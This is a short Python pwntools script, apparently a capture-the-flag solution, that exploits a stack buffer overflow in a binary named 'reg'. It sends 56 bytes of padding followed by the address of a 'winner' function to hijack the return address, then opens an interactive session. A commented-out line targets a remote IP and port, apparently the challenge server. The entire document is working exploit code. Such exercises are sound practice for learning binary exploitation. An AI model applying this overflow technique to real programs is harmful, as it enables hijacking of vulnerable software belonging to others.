

from pwn import *

#context.log_level = 'DEBUG'
context(os='linux', arch='amd64')

elf = context.binary = ELF('/home/kali/Downloads/reg')

info("%#x winner", elf.symbols.winner)
winner_address = p64(elf.symbols.winner)

padding_length = 56

log.info('Create IO')
#io = remote('139.59.176.147', 31006)
io = process('/home/kali/Downloads/reg')


padding = b'A' * padding_length
payload = padding + winner_address

log.info('Send Payload')
io.sendlineafter('name : ', payload)

io.interactive()


